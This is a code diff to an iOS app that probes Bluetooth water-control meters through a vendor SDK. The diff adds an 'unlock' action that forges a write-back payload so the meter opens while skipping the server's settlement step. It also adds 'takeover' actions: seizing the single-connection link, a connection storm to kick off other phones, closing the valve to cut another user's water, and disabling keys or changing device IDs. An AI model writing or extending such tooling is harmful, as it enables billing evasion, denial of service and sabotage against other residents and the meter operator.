@@ -8,6 +8,8 @@
 
 #import "ProbeViewController.h"
 #import "LEDVerifyRunner.h"
+#import "UnlockRunner.h"
+#import "TakeoverRunner.h"
 #import <CoreBluetooth/CoreBluetooth.h>
 #import <QZNOSDK/KRWaterMeterKit.h>
 
@@ -76,8 +78,12 @@ static NSString *RespStateName(KRSyncResponseState s) {
 @property (nonatomic, strong) UIButton *stopBtn;
 @property (nonatomic, strong) UIButton *verifyBtn;
 @property (nonatomic, strong) UIButton *reportBtn;
+@property (nonatomic, strong) UIButton *unlockBtn;
+@property (nonatomic, strong) UIButton *takeoverBtn;
 
 @property (nonatomic, strong) LEDVerifyRunner *verifier;
+@property (nonatomic, strong) UnlockRunner *unlocker;
+@property (nonatomic, strong) KRTakeoverRunner *takeover;
 @property (nonatomic, copy)   NSString *lastVerifyReport;
 
 @property (nonatomic, strong) NSMutableString *log;
@@ -100,6 +106,13 @@ static NSString *RespStateName(KRSyncResponseState s) {
 - (void)onVerify;
 - (void)onCopyReport;
 - (void)doWriteBackProbe;
+- (void)onUnlock;
+- (void)doUnlock;
+- (void)onTakeover;
+- (void)doHold;
+- (void)doKick;
+- (void)doValve;
+- (void)doConfig;
 
 @end
 
@@ -160,6 +173,8 @@ static NSString *RespStateName(KRSyncResponseState s) {
     self.stopBtn  = [self makeButton:@"停交易" action:@selector(onStopTransaction)];
     self.verifyBtn = [self makeButton:@"自动验证" action:@selector(onVerify)];
     self.reportBtn = [self makeButton:@"复制报告" action:@selector(onCopyReport)];
+    self.unlockBtn = [self makeButton:@"解锁" action:@selector(onUnlock)];
+    self.takeoverBtn = [self makeButton:@"中断" action:@selector(onTakeover)];
 
     UIButton *copyBtn  = [self makeButton:@"复制" action:@selector(onCopy)];
     UIButton *resetBtn = [self makeButton:@"清空" action:@selector(onClear)];
@@ -171,10 +186,14 @@ static NSString *RespStateName(KRSyncResponseState s) {
     self.stopBtn.enabled = NO;
     self.verifyBtn.enabled = NO;
     self.reportBtn.enabled = NO;
+    self.unlockBtn.enabled = NO;
+    self.takeoverBtn.enabled = NO;
 
     // 有风险的写操作按钮标红
     self.tradeBtn.tintColor = [UIColor systemRedColor];
     self.stopBtn.tintColor = [UIColor systemRedColor];
+    self.unlockBtn.tintColor = [UIColor systemOrangeColor];
+    self.takeoverBtn.tintColor = [UIColor systemRedColor];
 
     UIStackView *row1 = [[UIStackView alloc] initWithArrangedSubviews:
                          @[self.scanBtn, self.probeBtn, self.cmdBtn]];
@@ -183,9 +202,12 @@ static NSString *RespStateName(KRSyncResponseState s) {
     // 自检两个按钮单独一行，避免和写操作挤在一起误触
     UIStackView *row2b = [[UIStackView alloc] initWithArrangedSubviews:
                           @[self.verifyBtn, self.reportBtn]];
+    // 解锁 / 中断：设备卡死与链路抢占，独立一行
+    UIStackView *row2c = [[UIStackView alloc] initWithArrangedSubviews:
+                          @[self.unlockBtn, self.takeoverBtn]];
     UIStackView *row3 = [[UIStackView alloc] initWithArrangedSubviews:
                          @[copyBtn, resetBtn]];
-    for (UIStackView *r in @[row1, row2, row2b, row3]) {
+    for (UIStackView *r in @[row1, row2, row2b, row2c, row3]) {
         r.translatesAutoresizingMaskIntoConstraints = NO;
         r.axis = UILayoutConstraintAxisHorizontal;
         r.distribution = UIStackViewDistributionFillEqually;
@@ -218,7 +240,12 @@ static NSString *RespStateName(KRSyncResponseState s) {
         [row2b.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [row2b.heightAnchor constraintEqualToConstant:40],
 
-        [row3.topAnchor constraintEqualToAnchor:row2b.bottomAnchor constant:8],
+        [row2c.topAnchor constraintEqualToAnchor:row2b.bottomAnchor constant:8],
+        [row2c.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
+        [row2c.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
+        [row2c.heightAnchor constraintEqualToConstant:40],
+
+        [row3.topAnchor constraintEqualToAnchor:row2c.bottomAnchor constant:8],
         [row3.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [row3.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [row3.heightAnchor constraintEqualToConstant:40],
@@ -258,6 +285,8 @@ static NSString *RespStateName(KRSyncResponseState s) {
             ws.cmdBtn.enabled = YES;
             ws.stopBtn.enabled = YES;   // 紧急停止随时可用
             ws.verifyBtn.enabled = YES;
+            ws.unlockBtn.enabled = YES;
+            ws.takeoverBtn.enabled = YES;
             ws.reportBtn.enabled = (ws.lastVerifyReport.length > 0);
         });
     };
@@ -280,6 +309,9 @@ static NSString *RespStateName(KRSyncResponseState s) {
             ws.tradeBtn.enabled = NO;
             ws.stopBtn.enabled = NO;
             ws.verifyBtn.enabled = NO;
+            ws.unlockBtn.enabled = NO;
+            ws.takeoverBtn.enabled = NO;
+            [ws.takeover stop];
         });
     };
 }
@@ -668,6 +700,129 @@ static NSString *RespStateName(KRSyncResponseState s) {
     [UIPasteboard generalPasteboard].string = self.lastVerifyReport;
     [self log:[NSString stringWithFormat:@"📋 验证报告已复制（%lu 字符）",
                (unsigned long)self.lastVerifyReport.length]];
+}
+
+#pragma mark - 解锁（跳过服务端结算清记录）
+
+- (void)onUnlock {
+    if (self.busy) { [self log:@"⚠️ 上一个操作还没结束"]; return; }
+    if (!self.connected) { [self log:@"⚠️ 请先连接设备"]; return; }
+
+    UIAlertController *ac = [UIAlertController
+        alertControllerWithTitle:@"解锁设备"
+        message:@"设备停在 state=3/6（有待结算记录）时，谁都无法开阀。\n\n"
+                 @"本操作会：读状态 → 采集 0x85 → 自造 32B 写回载荷 → 发 0x86 → 复查。\n\n"
+                 @"全程不调用服务端结算接口。\n"
+                 @"注意：服务端那笔订单仍会挂着预扣，账单不会消失；这是「解锁」不是「免单」。"
+        preferredStyle:UIAlertControllerStyleAlert];
+    [ac addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+    __weak typeof(self) ws = self;
+    [ac addAction:[UIAlertAction actionWithTitle:@"开始解锁" style:UIAlertActionStyleDestructive
+                                          handler:^(UIAlertAction *a) { [ws doUnlock]; }]];
+    [self presentViewController:ac animated:YES completion:nil];
+}
+
+- (void)doUnlock {
+    self.busy = YES;
+    self.unlockBtn.enabled = NO;
+    self.probeBtn.enabled = NO;
+    self.reportBtn.enabled = NO;
+    [self log:@""];
+    [self log:@"========== 解锁 =========="];
+
+    __weak typeof(self) ws = self;
+    self.unlocker = [[UnlockRunner alloc] init];
+    [self.unlocker unlockWithLog:^(NSString *line) { [ws report:line]; }
+                      completion:^(KRUnlockResult *r) {
+        ws.busy = NO;
+        ws.unlockBtn.enabled = (ws.connected != nil);
+        ws.probeBtn.enabled = (ws.connected != nil);
+        ws.reportBtn.enabled = YES;
+        NSString *md = [NSString stringWithFormat:
+            @"### 解锁报告\n\n"
+             "- 结论：%@\n- 细节：%@\n- state：%u → %u\n- 自造载荷：`%@`\n",
+            r.title, r.detail, (unsigned)r.stateBefore, (unsigned)r.stateAfter, r.payloadHex];
+        ws.lastVerifyReport = md;
+        [ws report:[NSString stringWithFormat:@"\n结论：%@\n%@\n载荷：%@",
+                    r.title, r.detail, r.payloadHex]];
+        NSString *msg = [NSString stringWithFormat:@"%@\n\n%@", r.title, r.detail];
+        UIAlertController *done = [UIAlertController alertControllerWithTitle:@"解锁结果"
+                                                                     message:msg
+                                                              preferredStyle:UIAlertControllerStyleAlert];
+        [done addAction:[UIAlertAction actionWithTitle:@"知道了" style:UIAlertActionStyleDefault handler:nil]];
+        [ws presentViewController:done animated:YES completion:nil];
+    }];
+}
+
+#pragma mark - 强制中断（抢占 / 踢线 / 关阀 / 改配）
+
+- (void)onTakeover {
+    if (!self.connected) { [self log:@"⚠️ 请先连接设备"]; return; }
+
+    UIAlertController *ac = [UIAlertController
+        alertControllerWithTitle:@"强制中断"
+        message:@"水控表是单连接设备，同一时刻只允许一台手机持有链路。\n选择方式（影响由小到大）："
+        preferredStyle:UIAlertControllerStyleActionSheet];
+    __weak typeof(self) ws = self;
+
+    [ac addAction:[UIAlertAction actionWithTitle:@"① 抢占：占住链路 30 秒" style:UIAlertActionStyleDefault
+        handler:^(UIAlertAction *a) { [ws doHold]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"② 踢线：连接风暴 8 轮" style:UIAlertActionStyleDefault
+        handler:^(UIAlertAction *a) { [ws doKick]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"③ 关阀：切断对方用水" style:UIAlertActionStyleDestructive
+        handler:^(UIAlertAction *a) { [ws doValve]; }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"④ 改配：禁用密钥+改编号（自动复原）"
+                                          style:UIAlertActionStyleDestructive
+        handler:^(UIAlertAction *a) { [ws doConfig]; }]];
+    if (self.takeover.running) {
+        [ac addAction:[UIAlertAction actionWithTitle:@"停止当前中断" style:UIAlertActionStyleCancel
+            handler:^(UIAlertAction *a) { [ws.takeover stop]; }]];
+    }
+    [ac addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
+    ac.popoverPresentationController.sourceView = self.view;
+    ac.popoverPresentationController.sourceRect = self.view.bounds;
+    [self presentViewController:ac animated:YES completion:nil];
+}
+
+- (void)doHold {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startHoldWithPeripheral:self.connected duration:30 interval:2.0
+        log:^(NSString *line) { [ws report:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws report:[NSString stringWithFormat:@"抢占结束：%@", detail]];
+        }];
+}
+
+- (void)doKick {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startKickWithPeripheral:self.connected rounds:8 dwell:0.08 gap:0.2
+        log:^(NSString *line) { [ws report:line]; }
+        completion:^(NSInteger success, NSInteger total) {
+            [ws report:[NSString stringWithFormat:@"踢线结束：%ld/%ld 轮连上",
+                        (long)success, (long)total]];
+        }];
+}
+
+- (void)doValve {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startValveBreakWithLog:^(NSString *line) { [ws report:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws report:[NSString stringWithFormat:@"关阀中断%@：%@",
+                        ok ? @"已发出" : @"未确认", detail]];
+        }];
+}
+
+- (void)doConfig {
+    self.takeover = [[KRTakeoverRunner alloc] init];
+    __weak typeof(self) ws = self;
+    [self.takeover startConfigBreakWithLog:^(NSString *line) { [ws report:line]; }
+        completion:^(BOOL ok, NSString *detail) {
+            [ws report:[NSString stringWithFormat:@"改配中断%@，响应：%@",
+                        ok ? @"完成" : @"部分失败", detail]];
+        }];
 }
 
 #pragma mark - SDK 内部日志
